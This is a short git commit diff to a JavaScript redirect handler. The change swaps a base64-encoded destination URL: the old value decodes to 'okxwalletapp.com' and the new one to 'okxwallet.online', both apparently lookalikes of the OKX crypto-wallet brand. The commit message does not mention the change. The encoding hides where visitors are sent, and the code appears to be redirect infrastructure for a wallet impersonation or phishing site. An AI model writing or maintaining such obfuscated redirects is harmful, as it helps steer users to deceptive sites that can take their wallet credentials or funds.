fc54bdb6ae9890c4e75e9032f50277aff337777c
SeorangInfluence <65433734+SeorangInfluenceweb3@users.noreply.github.com>
2025-07-28 08:02:30 +0700

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
   
-  const encoded = 'aHR0cHM6Ly9va3h3YWxsZXRhcHAuY29t';
+  const encoded = 'aHR0cHM6Ly9va3h3YWxsZXQub25saW5l';
   const decodedUrl = Buffer.from(encoded, 'base64').toString('utf-8');
 
   res.writeHead(302, {
